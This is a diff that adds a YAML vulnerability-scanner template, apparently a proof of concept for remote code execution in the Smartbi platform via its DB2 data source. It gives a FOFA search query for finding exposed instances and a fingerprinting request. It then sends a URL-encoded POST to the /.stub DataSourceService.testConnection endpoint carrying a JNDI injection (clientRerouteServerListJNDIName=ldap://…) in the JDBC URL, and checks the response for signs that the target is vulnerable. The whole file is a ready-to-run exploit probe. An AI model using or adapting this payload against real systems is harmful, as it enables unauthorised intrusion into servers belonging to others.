@@ -1,0 +1,36 @@
+id: poc-yaml-smartbi-db2-rce
+info:
+  name: Smartbi平台db2 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: smartbi
+  fofa: app="SMARTBI" || body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
+variables:
+  path: 'vision
+
+    smartbi/vision'
+requests:
+- method: GET
+  path: /{{.path}}/index.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,"gcfutil = jsloader.resolve(''smartbi.gcf.gcfutil'')")
+
+    '
+- method: POST
+  path: /{{.path}}/.stub?className=DataSourceService&methodName=testConnection&params=%5B%7B%22driverType%22%3A%22aaa%22%2C%22driver%22%3A%22com.ibm.db2.jcc.DB2Driver%22%2C%22maxConnection%22%3A1%2C%22transactionIsolation%22%3A1%2C%22validationQueryMethod%22%3A3%2C%22url%22%3A%22jdbc%3Adb2%3A%2F%2F127.0.0.1%3A18080%2Fa%3AclientRerouteServerListJNDIName%3Dldap%3A%2F%2F127.0.0.1%22%7D%5D
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/119.0.0.0 Safari/537.36
+  expression: 'status_code == 200 &&
+
+    contains(body,"CONNECTION_POOL_NOT_INITIAL") &&
+
+    contains(body,"连接池初始化失败") &&
+
+    contains(body,"127.0.0.1")
+
+    '
+transport: http
